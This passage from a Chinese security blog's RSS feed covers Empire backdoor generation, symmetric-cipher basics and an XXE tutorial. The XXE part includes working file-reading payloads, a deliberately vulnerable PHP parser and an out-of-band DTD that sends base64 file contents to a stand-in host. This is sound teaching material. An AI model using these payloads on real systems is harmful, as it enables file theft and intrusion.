http以后直接按照默认配置执行execute会启动http80端口的监听当然也可以通过info命令显示选项，通过set命令调整设置以后再execute启动</p><h4 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h4><p>设置完监听模式以后生成payload<br>可以直接通过launcher powershel[python]http生成连接到对应的监听器的payload</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606152928138.png" alt="image-20200606152928138"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153712491.png" alt="image-20200606153712491"><br><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153724477.png" alt="image-20200606153724477"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153758800.png" alt="image-20200606153758800"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153817638.png" alt="image-20200606153817638"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153853515.png" alt="image-20200606153853515"></p>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#disqus_thread</comments>
    </item>
    
    <item>
      <title>现代对称加密算法原理</title>
      <link>http://yoursite.com/undefined/%E7%8E%B0%E4%BB%A3%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</link>
      <guid>http://yoursite.com/undefined/%E7%8E%B0%E4%BB%A3%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</guid>
      <pubDate>Wed, 20 May 2020 12:27:00 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;对称密码沿用替代置换等古典密码技术(混乱与扩散) , 被称为传统密码&lt;/p&gt;
&lt;h3 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>对称密码沿用替代置换等古典密码技术(混乱与扩散) , 被称为传统密码</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><h4 id="加密算法："><a href="#加密算法：" class="headerlink" title="加密算法："></a>加密算法：</h4><p>一次性密码本+完美秘密+伪随机数生成+Diffie-Hellman密钥交换</p><h5 id="一次性码本原理："><a href="#一次性码本原理：" class="headerlink" title="一次性码本原理："></a>一次性码本原理：</h5><p>首先是需要加密的明文：“hello”; ——————————————5位字母</p><p>然后生成一串拥有与明文相同位数的随机位移：“2,3,1,2,1”———-5个位移</p><p>每个位移分别对应相同位的字母进行位移得到密文：</p><p><strong>这样加密的信息有两个强大的特性。</strong></p><p>第一：位移没有重复的规律</p><p>第二：加密的消息将有一个均匀的频率分布，将不会被频率分析破解</p><h5 id="完美密码原理："><a href="#完美密码原理：" class="headerlink" title="完美密码原理："></a>完美密码原理：</h5><p>假设A写信给B,长度为20个字母，下一步，A用一个和B共享的密钥，它由20个随机生成的位移组成， 每个位移在1到26之间，密钥空间就是所有可能结果的组合。所以，生成一个密钥相当于，从这20个字母的组合中随机选一个</p><p>例：</p><p>假设要将   “ALICE”   通过位移加密，首先随机生成5个位移，每个位移的值为0-26，对应26个英文字母。</p><p>当使用位移进行加密时，也就是说A经过位移有26种可能，然后L经过位移也有26种可能 ……… 一共就是:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">位移空间 &#x3D; 26*26*26*26*26</span><br></pre></td></tr></table></figure><p>然后因为是随机得到的5个位移，就能理解每一个位移都有26种可能，所以密钥空间为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密钥空间 &#x3D; 26*26*26*26*26</span><br></pre></td></tr></table></figure><p>当使用密钥空间中的 “一种密钥” 对位移空间的 “一种位移可能” 进行加密时，生成一种对应的密文信息；</p><p>所以密文信息空间的大小等于密钥空间；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密文信息空间&#x3D;位移空间&#x3D;密钥空间</span><br></pre></td></tr></table></figure><p>这对应了完美密码，当有人仅仅获得了加密文字的一页，他们所知道的唯一的事情是每个消息是同等可能的。所以无论有多大的计算能力，都不能帮助改进一个盲目的猜测。</p><p>现在要考虑的是在考虑一次性码本的时候，是我们需要事先分享这些长长的密钥，为了解决这个问题 ，我们需要放松对秘密的定义，这需要引入伪随机数的概念。</p><h5 id="伪随机数生成原理："><a href="#伪随机数生成原理：" class="headerlink" title="伪随机数生成原理："></a>伪随机数生成原理：</h5><p>首先选择一个数</p><p>例 “121” ，称之为 “种子”</p><p>然后将 “种子” 相乘获得乘积 “14641”  </p><p>再从乘积中取中间的与”种子“相同位数的一个数 “464”，</p><p>重复生成乘积，再取中间值，最后生成一串随机数</p><p>这个方法叫做 “中间平方”</p><p>生成的随机数序列的随机性依赖于最初种子的随机性，同样的种子，导致同样的序列，所以，随机生成的序列区别于伪随机生成的序列的实质是什么？</p><p>中间平方的生成会有一个周期，但是当“种子”的长度增加，就会加大这个周期</p><p>与之同时带来一个问题，如何分享这个随机数的种子</p><h5 id="Diffie-Hellman密钥交换原理："><a href="#Diffie-Hellman密钥交换原理：" class="headerlink" title="Diffie-Hellman密钥交换原理："></a>Diffie-Hellman密钥交换原理：</h5><p><img src= "/img/loading.gif" data-src="https://pic3.zhimg.com/80/5d668818881609c8543e6efa7c0d6af1_720w.jpg" alt=""></p><p>上图很经典<br>它的数学基础就是离散对数这个数学难题。用它进行密钥交换的过程简述如下： </p><p>选取两个大数p和g并公开，其中p是一个素数，g是p的一个<strong>模p本原单位根(primitive root module p)</strong>，所谓<strong>本原单位根</strong>就是指在<strong>模p乘法运算下</strong>，g的1次方，2次方……(p-1)次方这p-1个数互不相同，并且取遍1到p-1； </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于Alice(其中的一个通信者)，随机产生一个整数a，a对外保密，计算Ka &#x3D; g^a mod p，将Ka发送给Bob；</span><br><span class="line"></span><br><span class="line">对于Bob(另一个通信者)，随机产生一个整数b，b对外保密，计算Kb &#x3D; g^b mod p，将Kb发送给Alice； </span><br><span class="line"></span><br><span class="line">在Alice方面，收到Bob送来的Kb后，计算出密钥为：key &#x3D; Kb^a mod p &#x3D; g^(b*a) mod p mod p； </span><br><span class="line"></span><br><span class="line">对于Bob，收到Alice送来的Ka后，计算出密钥为：key &#x3D; Ka ^ b mod p &#x3D; g^(a*b) mod p mod p。</span><br><span class="line"></span><br><span class="line">攻击者知道p和g，并且截获了Ka和Kb，但是当它们都是非常大的数的时候，依靠这四个数来计算a和b非常困难，这就是离散对数数学难题。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）Alice与Bob确定两个大素数n和g，这两个数不用保密 </span><br><span class="line">（2）Alice选择另一个大随机数x，并计算A如下：A&#x3D;g^xmod n </span><br><span class="line">（3）Alice将A发给Bob </span><br><span class="line">（4）Bob  选择另一个大随机数y，并计算B如下：B&#x3D;g^ymod n </span><br><span class="line">（5）Bob将B发给Alice </span><br><span class="line">（6）计算秘密密钥K1如下：K1&#x3D;B^xmod n </span><br><span class="line">（7）计算秘密密钥K2如下：K2&#x3D;A^ymod n  K1&#x3D;K2，因此Alice和Bob可以用其进行加解密</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/%E7%8E%B0%E4%BB%A3%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/#disqus_thread</comments>
    </item>
    
    <item>
      <title>XXE漏洞原理</title>
      <link>http://yoursite.com/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</link>
      <guid>http://yoursite.com/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</guid>
      <pubDate>Tue, 19 May 2020 00:08:40 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>[TOC]</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p><p>xxe漏洞主要针对web-service危险的引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等．首先存在漏洞的web服务一定是存在xml传输数据的，可以在http头的content-type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）．或者一些常见的采用xml的java服务配置文件（spring，struts2）．不过现实中存在的大多数xxe漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机．</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul><li>XML</li><li>DTD</li></ul><h4 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h4><p>XML 指可扩展标记语言（eXtensible Markup  Language）。</p><p>XML 被设计用来传输和存储数据。</p><p>如果你需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p><p>通过 XML，数据能够存储在独立的 XML 文件中。这样您就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p><p>通过使用几行 JavaScript 代码，您就可以读取一个外部 XML 文件，并更新您的网页的数据内容。（这里不解释js如何读取xml数据）</p><h4 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h5 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h5><p>这是一个xml结构：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;                &#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;message&gt;                                               &#x2F;&#x2F;定义一个根元素</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;                             &#x2F;&#x2F;定义子元素receiver的内容为Myself</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;                                &#x2F;&#x2F;同上</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;                            &#x2F;&#x2F;同上</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;                      &#x2F;&#x2F;同上</span><br><span class="line">&lt;&#x2F;message&gt;                                              &#x2F;&#x2F;根元素结尾标签</span><br></pre></td></tr></table></figure><p>如果使用DTD来定义：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;                                   &#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [                                     &#x2F;&#x2F;定义一个根元素</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;      &#x2F;&#x2F;定义根元素包含的子元素，通过圆括号定义</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;                           &#x2F;&#x2F;定义子元素(#PCDATA)表示只有数据的元素</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;                             &#x2F;&#x2F;同上 </span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;紧跟在XML标头之后，是文档类型声明，通常称为&#96;DOCTYPE&#96;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;DOCTYPE声明后跟DTD的主体，可以在主体中声明 &quot;元素&quot;，&quot;属性&quot;，&quot;实体&quot; 和 &quot;符号&quot; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;方括号[]包含一个称为内部子集的可选实体声明列表。</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;带有一个或多个子元素的元素通过圆括号中的子元素名进行声明</span><br></pre></td></tr></table></figure><p>DTD语法<br>所有DTD元素声明都有这种一般形式 </p><figure class="highlight plain"><figcaption><span>elementname (content)></span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT elementname (content)&gt;</span><br></pre></td></tr></table></figure><ul><li><p><code>ELEMENT</code>声明用于指示要定义元素的解析器。</p></li><li><p><code>elementname</code>是定义的元素名称(也称为通用标识符)。</p></li><li><p><code>content</code>定义了元素中可以包含的内容(如果有的话)。</p></li></ul><h3 id="什么是实体注入"><a href="#什么是实体注入" class="headerlink" title="什么是实体注入"></a>什么是实体注入</h3><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 XML 中除了能标签以外，还需要有些内容是固定的</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明</span><br><span class="line">&#x2F;&#x2F;通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><h4 id="重点二："><a href="#重点二：" class="headerlink" title="重点二："></a>重点二：</h4><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p><p><strong>1.通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)<font color=red>只有在 DTD 文件中，参数实体的声明才能引用其他实体</font><br>(3)和通用实体一样，参数实体也可以外部引用</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><p><strong>抛砖：</strong></p><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><h4 id="我们能做什么？"><a href="#我们能做什么？" class="headerlink" title="我们能做什么？"></a>我们能做什么？</h4><p>上面疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p><p>实际上，当你看到下面这段代码的时候，有一点安全意识的小伙伴应该隐隐约约能觉察出什么</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p><h3 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a><strong>实验一：有回显读本地敏感文件(Normal XXE)</strong></h3><p>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>本地服务器上放上解析 XML 的 php 代码：</p><p><strong>示例代码：</strong></p><p><strong>xml.php</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);             &#x2F;&#x2F;关闭禁用xml外部实体</span><br><span class="line">    $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); </span><br><span class="line">    $dom &#x3D; new DOMDocument();                         &#x2F;&#x2F;创建xml对象</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     </span><br><span class="line">    $creds &#x3D; simplexml_import_dom($dom);               </span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;file_get_contents() 函数把整个文件读入一个字符串中。php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流。</span><br><span class="line">这里相当于获取post过去的xml代码</span><br><span class="line">&#x2F;&#x2F;loadxml加载xml代码</span><br><span class="line">&#x2F;&#x2F;LIBXML_NOENT: 将 XML中的实体引用替换成对应的值</span><br><span class="line">&#x2F;&#x2F;LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件</span><br><span class="line">&#x2F;&#x2F;simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象。</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p><strong>结果如下图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/3MhyU4U.png" alt=""></p><p>成功读取system.in文件内容</p><p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p><p><strong>如图所示：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/LxYOrGA.png" alt=""></p><p><strong>结果如下图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/XGXPp9F.png" alt=""></p><p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下：</p><p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者<br>“ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure><p>可以输入任意字符除了 ]]&gt; 不能嵌套</p><p>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</p><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p><p>首先，找到问题出现的地方，问题出现在</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;system.ini&quot;&gt; ]&gt;</span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 <code>&lt;![CDATA[&quot; 和 &quot;]]&gt;</code>,但是好像没有任何语法告诉我们字符串能拼接的。</p><p><strong>使用参数实体引用其他实体</strong></p><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure><p><strong>evil.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;            &#x2F;&#x2F;引用start，goodies，end实体内容，CDATA输出</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;参数实体的作用是作为DTD中的元素的条件控制。参数实体定义以%作为开头，引用也以%开头，以;结尾。一般实体的定义无%开头，引用以&amp;开头，以;结尾</span><br></pre></td></tr></table></figure><p><strong>结果如图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/rPu8UmV.png" alt=""></p><h3 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a><strong>实验二：无回显读取本地敏感文件(Blind OOB XXE)</strong></h3><h4 id="新的问题出现"><a href="#新的问题出现" class="headerlink" title="新的问题出现"></a>新的问题出现</h4><p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p><h4 id="新的解决方法"><a href="#新的解决方法" class="headerlink" title="新的解决方法"></a>新的解决方法</h4><p>想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p><p><strong>xml.php</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$dom &#x3D; new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>test.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64 encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;因为实体的值中不能有 %, 所以讲send前的 “%” 转换成html实体编码 “&amp;#37”;</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong>结果如图：</strong></p><p>环境问题，先不搭了。。。。。。。</p><p><strong>整个调用过程：</strong></p><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件（file传入到send的过程中已经执行，传入到send是已经得到的值），然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p><h4 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a>新的思考：</h4><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 